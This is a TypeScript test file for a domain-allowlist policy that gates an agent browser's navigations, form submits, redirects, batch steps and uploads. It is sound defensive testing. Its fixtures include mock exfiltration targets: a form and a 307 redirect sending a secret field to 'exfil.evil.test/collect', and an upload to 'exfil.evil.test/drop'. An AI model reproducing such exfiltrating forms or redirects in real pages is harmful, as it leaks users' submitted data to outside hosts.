/**
 * Per-domain browser command policy tests (issue #19882). Deterministic and
 * real: the actual policy registry, the real BrowserService dispatcher, and
 * the real JSDOM workspace form-submit path are exercised — no mock stands in
 * for the system under test. Covers allow/block/require_confirmation verdicts,
 * fail-closed evaluation for throwing and malformed policies, unknown-domain
 * fail-closed behavior, nested batch step gating, confirmed-upload gating, and
 * interception at every resolved URL — the form's submit action, an anchor's
 * href, and each redirect hop. Redirects are driven deterministically through
 * the workspace's own network-route mechanism (a routed 302/307 response),
 * so no live network is involved.
 */

import { afterEach, describe, expect, it, vi } from "vitest";
import {
  type BrowserDomainPolicy,
  browserDomainPolicyRequestForCommand,
  classifyBrowserCommandEffect,
  createBrowserDomainAllowlistPolicy,
  evaluateBrowserDomainPolicies,
  listBrowserDomainPolicies,
  registerBrowserDomainPolicy,
  unregisterBrowserDomainPolicy,
} from "../browser-domain-policy.js";
import { BrowserService, type BrowserTarget } from "../browser-service.js";

function clearRegisteredPolicies(): void {
  for (const policy of listBrowserDomainPolicies()) {
    unregisterBrowserDomainPolicy(policy.id);
  }
}

function createTarget(id: string): BrowserTarget & {
  execute: ReturnType<typeof vi.fn>;
} {
  const execute = vi.fn(async (command: { subaction: string }) => ({
    mode: "web" as const,
    subaction: command.subaction as never,
    value: id,
  }));
  return {
    id,
    name: id,
    description: id,
    priority: 100,
    available: async () => true,
    execute: execute as never,
  } as BrowserTarget & { execute: ReturnType<typeof vi.fn> };
}

afterEach(() => {
  clearRegisteredPolicies();
});

describe("classifyBrowserCommandEffect", () => {
  it("classifies known subactions into their effect classes", () => {
    expect(classifyBrowserCommandEffect("eval")).toBe("eval");
    expect(classifyBrowserCommandEffect("upload")).toBe("upload");
    expect(classifyBrowserCommandEffect("realistic-upload")).toBe("upload");
    expect(classifyBrowserCommandEffect("navigate")).toBe("navigate");
    expect(classifyBrowserCommandEffect("open")).toBe("navigate");
    expect(classifyBrowserCommandEffect("reload")).toBe("navigate");
    expect(classifyBrowserCommandEffect("snapshot")).toBe("read");
    expect(classifyBrowserCommandEffect("state")).toBe("read");
    expect(classifyBrowserCommandEffect("click")).toBe("interact");
    expect(classifyBrowserCommandEffect("fill")).toBe("interact");
  });

  it("treats unknown subactions as interact, never read", () => {
    expect(classifyBrowserCommandEffect("some-future-mutation")).toBe(
      "interact",
    );
  });
});

describe("evaluateBrowserDomainPolicies", () => {
  const request = {
    subaction: "navigate",
    effect: "navigate" as const,
    domain: "example.com",
    url: "https://example.com/a",
    targetId: null,
    phase: "dispatch" as const,
  };

  it("allows when no policies are registered", () => {
    expect(evaluateBrowserDomainPolicies(request).verdict).toBe("allow");
  });

  it("returns the first non-allow decision in registration order", () => {
    registerBrowserDomainPolicy({
      id: "first-allow",
      evaluate: () => ({
        verdict: "allow",
        reason: "ok",
        policyId: "first-allow",
      }),
    });
    registerBrowserDomainPolicy({
      id: "second-block",
      evaluate: () => ({
        verdict: "block",
        reason: "no",
        policyId: "second-block",
      }),
    });
    registerBrowserDomainPolicy({
      id: "third-confirm",
      evaluate: () => ({
        verdict: "require_confirmation",
        reason: "later",
        policyId: "third-confirm",
      }),
    });
    const decision = evaluateBrowserDomainPolicies(request);
    expect(decision.verdict).toBe("block");
    expect(decision.policyId).toBe("second-block");
  });

  it("fails closed when a policy throws", () => {
    registerBrowserDomainPolicy({
      id: "exploding",
      evaluate: () => {
        throw new Error("boom");
      },
    });
    const decision = evaluateBrowserDomainPolicies(request);
    expect(decision.verdict).toBe("block");
    expect(decision.reason).toContain("boom");
    expect(decision.policyId).toBe("exploding");
  });

  it("fails closed when a policy returns an unrecognized verdict", () => {
    registerBrowserDomainPolicy({
      id: "malformed",
      evaluate: () => ({ verdict: "maybe", reason: "?" }) as never,
    });
    expect(evaluateBrowserDomainPolicies(request).verdict).toBe("block");
  });

  it("rejects registration without an id and replaces by id", () => {
    expect(() =>
      registerBrowserDomainPolicy({
        id: "  ",
        evaluate: () => ({ verdict: "allow", reason: "", policyId: "" }),
      }),
    ).toThrow(/non-empty id/);
    const block: BrowserDomainPolicy = {
      id: "dup",
      evaluate: () => ({ verdict: "block", reason: "v1", policyId: "dup" }),
    };
    registerBrowserDomainPolicy(block);
    registerBrowserDomainPolicy({
      id: "dup",
      evaluate: () => ({ verdict: "allow", reason: "v2", policyId: "dup" }),
    });
    expect(listBrowserDomainPolicies()).toHaveLength(1);
    expect(evaluateBrowserDomainPolicies(request).verdict).toBe("allow");
  });
});

describe("createBrowserDomainAllowlistPolicy", () => {
  const policy = createBrowserDomainAllowlistPolicy({
    id: "allowlist",
    allowedDomains: ["Example.COM."],
  });
  const base = {
    subaction: "navigate",
    effect: "navigate" as const,
    url: null,
    targetId: null,
    phase: "dispatch" as const,
  };

  it("allows exact and subdomain matches after normalization", () => {
    expect(policy.evaluate({ ...base, domain: "example.com" }).verdict).toBe(
      "allow",
    );
    expect(
      policy.evaluate({ ...base, domain: "login.example.com" }).verdict,
    ).toBe("allow");
  });

  it("blocks non-matching and suffix-spoofed domains", () => {
    expect(policy.evaluate({ ...base, domain: "evil.com" }).verdict).toBe(
      "block",
    );
    expect(policy.evaluate({ ...base, domain: "notexample.com" }).verdict).toBe(
      "block",
    );
  });

  it("fails closed on an unresolvable domain for gated effects", () => {
    expect(policy.evaluate({ ...base, domain: null }).verdict).toBe("block");
  });

  it("allows ungated effects regardless of domain", () => {
    expect(
      policy.evaluate({
        ...base,
        effect: "read",
        subaction: "snapshot",
        domain: null,
      }).verdict,
    ).toBe("allow");
  });

  it("supports require_confirmation verdicts", () => {
    const confirming = createBrowserDomainAllowlistPolicy({
      id: "confirming",
      allowedDomains: ["example.com"],
      deniedVerdict: "require_confirmation",
      unknownDomainVerdict: "require_confirmation",
    });
    expect(confirming.evaluate({ ...base, domain: "evil.com" }).verdict).toBe(
      "require_confirmation",
    );
    expect(confirming.evaluate({ ...base, domain: null }).verdict).toBe(
      "require_confirmation",
    );
  });

  it("rejects an effectively empty allowlist", () => {
    expect(() =>
      createBrowserDomainAllowlistPolicy({
        id: "empty",
        allowedDomains: ["   ", "..."],
      }),
    ).toThrow(/at least one valid domain/);
  });
});

describe("browserDomainPolicyRequestForCommand", () => {
  it("derives the domain from a navigation URL", () => {
    const request = browserDomainPolicyRequestForCommand(
      { subaction: "navigate", url: "https://Sub.Example.com/path" },
      "workspace",
    );
    expect(request).toMatchObject({
      subaction: "navigate",
      effect: "navigate",
      domain: "sub.example.com",
      targetId: "workspace",
      phase: "dispatch",
    });
  });

  it("yields a null domain for commands without a URL and non-http URLs", () => {
    expect(
      browserDomainPolicyRequestForCommand({ subaction: "click" }, null).domain,
    ).toBeNull();
    expect(
      browserDomainPolicyRequestForCommand(
        { subaction: "navigate", url: "javascript:alert(1)" },
        null,
      ).domain,
    ).toBeNull();
  });
});

describe("BrowserService dispatch gating", () => {
  it("blocks a gated navigation before any target executes", async () => {
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "dispatch-allowlist",
        allowedDomains: ["example.com"],
      }),
    );
    const service = new BrowserService();
    const target = createTarget("workspace");
    service.registerTarget(target);

    await expect(
      service.execute({ subaction: "navigate", url: "https://evil.com/" }),
    ).rejects.toMatchObject({
      name: "BrowserDispatchFailure",
      kind: "POLICY_BLOCKED",
    });
    expect(target.execute).not.toHaveBeenCalled();

    const allowed = await service.execute({
      subaction: "navigate",
      url: "https://example.com/",
    });
    expect(allowed.value).toBe("workspace");
  });

  it("gates nested batch steps individually", async () => {
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "batch-allowlist",
        allowedDomains: ["example.com"],
      }),
    );
    const service = new BrowserService();
    const target = createTarget("workspace");
    service.registerTarget(target);

    await expect(
      service.execute({
        subaction: "batch",
        steps: [
          { subaction: "snapshot" },
          {
            subaction: "batch",
            steps: [{ subaction: "open", url: "https://evil.com/login" }],
          },
        ],
      }),
    ).rejects.toMatchObject({ kind: "POLICY_BLOCKED" });
    expect(target.execute).not.toHaveBeenCalled();
  });

  it("surfaces require_confirmation as a distinct POLICY_BLOCKED message", async () => {
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "confirm-allowlist",
        allowedDomains: ["example.com"],
        deniedVerdict: "require_confirmation",
      }),
    );
    const service = new BrowserService();
    service.registerTarget(createTarget("workspace"));

    await expect(
      service.execute({ subaction: "navigate", url: "https://evil.com/" }),
    ).rejects.toThrow(/requires explicit confirmation/);
  });

  it("keeps dispatch unaffected when no policies are registered", async () => {
    const service = new BrowserService();
    service.registerTarget(createTarget("workspace"));
    const result = await service.execute({
      subaction: "navigate",
      url: "https://anywhere.example.net/",
    });
    expect(result.value).toBe("workspace");
  });

  it("still hard-blocks generic eval regardless of an allow-everything policy", async () => {
    registerBrowserDomainPolicy({
      id: "allow-everything",
      evaluate: () => ({
        verdict: "allow",
        reason: "yes",
        policyId: "allow-everything",
      }),
    });
    const service = new BrowserService();
    service.registerTarget(createTarget("workspace"));
    await expect(
      service.execute({ subaction: "eval" } as never),
    ).rejects.toMatchObject({ kind: "POLICY_BLOCKED" });
  });
});

describe("workspace form submit interception", () => {
  const formHtml = `<!doctype html><html><head><title>Form</title></head><body>
    <form action="https://exfil.evil.test/collect" method="post">
      <input id="q" name="q" value="secret" />
      <button id="go" type="submit">Go</button>
    </form></body></html>`;
  const webEnv: NodeJS.ProcessEnv = {};

  it("blocks a JSDOM form submit whose resolved action leaves the allowlist", async () => {
    const {
      __resetBrowserWorkspaceStateForTests,
      executeBrowserWorkspaceCommand,
      openBrowserWorkspaceTab,
    } = await import("../workspace/browser-workspace.js");
    await __resetBrowserWorkspaceStateForTests();
    const tab = await openBrowserWorkspaceTab(
      { show: true, url: "about:blank" },
      webEnv,
    );
    await executeBrowserWorkspaceCommand(
      {
        id: tab.id,
        networkAction: "route",
        responseBody: formHtml,
        subaction: "network",
        url: "https://shop.test/",
      },
      webEnv,
    );
    await executeBrowserWorkspaceCommand(
      { id: tab.id, subaction: "navigate", url: "https://shop.test/" },
      webEnv,
    );

    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "submit-allowlist",
        allowedDomains: ["shop.test"],
        gatedEffects: ["submit"],
      }),
    );
    try {
      await expect(
        executeBrowserWorkspaceCommand(
          { id: tab.id, selector: "#go", subaction: "click" },
          webEnv,
        ),
      ).rejects.toThrow(/domain policy "submit-allowlist"/);
    } finally {
      await __resetBrowserWorkspaceStateForTests();
    }
  });
});

describe("resolved-URL navigation and redirect interception", () => {
  const webEnv: NodeJS.ProcessEnv = {};

  async function openSeededTab(
    routes: {
      url: string;
      body: string;
      status?: number;
      headers?: Record<string, string>;
    }[],
    startUrl: string,
  ) {
    const {
      __resetBrowserWorkspaceStateForTests,
      executeBrowserWorkspaceCommand,
      openBrowserWorkspaceTab,
    } = await import("../workspace/browser-workspace.js");
    await __resetBrowserWorkspaceStateForTests();
    const tab = await openBrowserWorkspaceTab(
      { show: true, url: "about:blank" },
      webEnv,
    );
    for (const route of routes) {
      await executeBrowserWorkspaceCommand(
        {
          id: tab.id,
          networkAction: "route",
          responseBody: route.body,
          responseHeaders: route.headers,
          responseStatus: route.status,
          subaction: "network",
          url: route.url,
        },
        webEnv,
      );
    }
    await executeBrowserWorkspaceCommand(
      { id: tab.id, subaction: "navigate", url: startUrl },
      webEnv,
    );
    return {
      tab,
      executeBrowserWorkspaceCommand,
      reset: __resetBrowserWorkspaceStateForTests,
    };
  }

  const linkHtml = `<!doctype html><html><head><title>Links</title></head><body>
    <a id="same" href="/inner">Same</a>
    <a id="spoof" href="https://evil-shop.test/x">Spoofed suffix</a>
    <a id="sub" href="https://login.shop.test/x">Subdomain</a>
    <a id="cross" href="https://denied.test/x">Cross</a>
    </body></html>`;

  it("blocks a denied cross-domain anchor click at the resolved href", async () => {
    const { tab, executeBrowserWorkspaceCommand, reset } = await openSeededTab(
      [{ url: "https://shop.test/", body: linkHtml }],
      "https://shop.test/",
    );
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "nav-allowlist",
        allowedDomains: ["shop.test"],
        gatedEffects: ["navigate"],
      }),
    );
    try {
      await expect(
        executeBrowserWorkspaceCommand(
          { id: tab.id, selector: "#cross", subaction: "click" },
          webEnv,
        ),
      ).rejects.toThrow(/domain policy "nav-allowlist"/);
      // The blocked navigation must be side-effect free: the live tab state
      // still reports the original page, and nothing was fetched from the
      // denied domain.
      const state = await executeBrowserWorkspaceCommand(
        { id: tab.id, subaction: "state" },
        webEnv,
      );
      expect(JSON.stringify(state)).toContain("https://shop.test/");
      expect(JSON.stringify(state)).not.toContain("denied.test");
    } finally {
      await reset();
    }
  });

  it("blocks a suffix-spoofed anchor target but allows same-domain and subdomain links", async () => {
    const { tab, executeBrowserWorkspaceCommand, reset } = await openSeededTab(
      [
        { url: "https://shop.test/", body: linkHtml },
        {
          url: "https://shop.test/inner",
          body: "<html><body>inner</body></html>",
        },
        {
          url: "https://login.shop.test/x",
          body: "<html><body>login</body></html>",
        },
      ],
      "https://shop.test/",
    );
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "nav-allowlist",
        allowedDomains: ["shop.test"],
        gatedEffects: ["navigate"],
      }),
    );
    try {
      await expect(
        executeBrowserWorkspaceCommand(
          { id: tab.id, selector: "#spoof", subaction: "click" },
          webEnv,
        ),
      ).rejects.toThrow(/domain policy "nav-allowlist"/);
      const sameResult = await executeBrowserWorkspaceCommand(
        { id: tab.id, selector: "#same", subaction: "click" },
        webEnv,
      );
      expect(JSON.stringify(sameResult)).toContain("https://shop.test/inner");
      // A subdomain of an allowlisted domain is permitted.
      await executeBrowserWorkspaceCommand(
        { id: tab.id, subaction: "navigate", url: "https://shop.test/" },
        webEnv,
      );
      const subResult = await executeBrowserWorkspaceCommand(
        { id: tab.id, selector: "#sub", subaction: "click" },
        webEnv,
      );
      expect(JSON.stringify(subResult)).toContain("https://login.shop.test/x");
    } finally {
      await reset();
    }
  });

  it("blocks a 307 form-submit redirect before the body reaches the denied target", async () => {
    const submitHtml = `<!doctype html><html><body>
      <form action="https://shop.test/submit" method="post">
        <input name="secret" value="hunter2" />
        <button id="go" type="submit">Go</button>
      </form></body></html>`;
    const { tab, executeBrowserWorkspaceCommand, reset } = await openSeededTab(
      [
        { url: "https://shop.test/", body: submitHtml },
        {
          url: "https://shop.test/submit",
          body: "",
          status: 307,
          headers: { location: "https://exfil.evil.test/collect" },
        },
        { url: "https://exfil.evil.test/collect", body: "<html></html>" },
      ],
      "https://shop.test/",
    );
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "submit-allowlist",
        allowedDomains: ["shop.test"],
        gatedEffects: ["submit", "navigate"],
      }),
    );
    try {
      await expect(
        executeBrowserWorkspaceCommand(
          { id: tab.id, selector: "#go", subaction: "click" },
          webEnv,
        ),
      ).rejects.toThrow(/domain policy "submit-allowlist"/);
      // No request was ever *issued* to the denied target: the 307 hop was
      // evaluated and rejected before it was followed, so the form body never
      // left for exfil.evil.test.
      const log = (await executeBrowserWorkspaceCommand(
        { id: tab.id, networkAction: "requests", subaction: "network" },
        webEnv,
      )) as { value: { url: string }[] };
      expect(log.value.length).toBeGreaterThan(0);
      expect(
        log.value.filter((entry) =>
          entry.url.startsWith("https://exfil.evil.test"),
        ),
      ).toEqual([]);
    } finally {
      await reset();
    }
  });

  it("blocks a redirect that bounces a navigation onto a denied domain", async () => {
    const { tab, executeBrowserWorkspaceCommand, reset } = await openSeededTab(
      // Routes match by substring with the most recently registered winning,
      // so the more specific /bounce route is registered last.
      [
        { url: "https://shop.test/", body: linkHtml },
        { url: "https://denied.test/landing", body: "<html></html>" },
        {
          url: "https://shop.test/bounce",
          body: "",
          status: 302,
          headers: { location: "https://denied.test/landing" },
        },
      ],
      "https://shop.test/",
    );
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "nav-allowlist",
        allowedDomains: ["shop.test"],
        gatedEffects: ["navigate"],
      }),
    );
    try {
      await executeBrowserWorkspaceCommand(
        { id: tab.id, subaction: "navigate", url: "https://shop.test/bounce" },
        webEnv,
      );
      // The document load is lazy; the redirect hop is taken (and rejected) on
      // the first command that materializes the page.
      await expect(
        executeBrowserWorkspaceCommand(
          { id: tab.id, subaction: "snapshot" },
          webEnv,
        ),
      ).rejects.toThrow(/domain policy "nav-allowlist"/);
    } finally {
      await reset();
    }
  });
});

describe("policy evaluation robustness", () => {
  it("blocks when a policy returns a non-decision value instead of throwing", () => {
    registerBrowserDomainPolicy({
      id: "null-returner",
      evaluate: (() => null) as unknown as BrowserDomainPolicy["evaluate"],
    });
    const decision = evaluateBrowserDomainPolicies({
      subaction: "navigate",
      effect: "navigate",
      domain: "example.com",
      url: "https://example.com/",
      targetId: null,
      phase: "dispatch",
    });
    expect(decision.verdict).toBe("block");
    expect(decision.policyId).toBe("null-returner");
  });

  it("blocks when a decision object's verdict accessor throws", () => {
    registerBrowserDomainPolicy({
      id: "getter-bomb",
      evaluate: (() => ({
        get verdict(): never {
          throw new Error("boom-from-getter");
        },
      })) as unknown as BrowserDomainPolicy["evaluate"],
    });
    const decision = evaluateBrowserDomainPolicies({
      subaction: "navigate",
      effect: "navigate",
      domain: "example.com",
      url: "https://example.com/",
      targetId: null,
      phase: "dispatch",
    });
    expect(decision.verdict).toBe("block");
    expect(decision.reason).toContain("boom-from-getter");
    expect(decision.policyId).toBe("getter-bomb");
  });

  it("supplies a reason when a blocking policy omits one", () => {
    registerBrowserDomainPolicy({
      id: "terse",
      evaluate: (() => ({
        verdict: "block",
      })) as unknown as BrowserDomainPolicy["evaluate"],
    });
    const decision = evaluateBrowserDomainPolicies({
      subaction: "navigate",
      effect: "navigate",
      domain: "example.com",
      url: "https://example.com/",
      targetId: null,
      phase: "dispatch",
    });
    expect(decision.verdict).toBe("block");
    expect(decision.reason).toMatch(/terse/);
  });
});

describe("confirmed upload policy gating", () => {
  it("blocks a denied-domain confirmed upload before the confirmation is consumed", async () => {
    const service = new BrowserService({} as never);
    const consumed: string[] = [];
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "upload-allowlist",
        allowedDomains: ["shop.test"],
        gatedEffects: ["upload"],
      }),
    );
    await expect(
      service.executeConfirmedUpload(
        {
          subaction: "upload",
          url: "https://exfil.evil.test/drop",
        } as never,
        {
          actionId: "action-1",
          requestedAt: new Date().toISOString(),
          confirmationGrant: {} as never,
          confirmationGrantConsumer: (() => {
            consumed.push("consumed");
            return {} as never;
          }) as never,
          session: { adapterId: "workspace" } as never,
          capabilities: {} as never,
        },
      ),
    ).rejects.toThrow(/domain policy "upload-allowlist"/);
    expect(consumed).toEqual([]);
  });
});
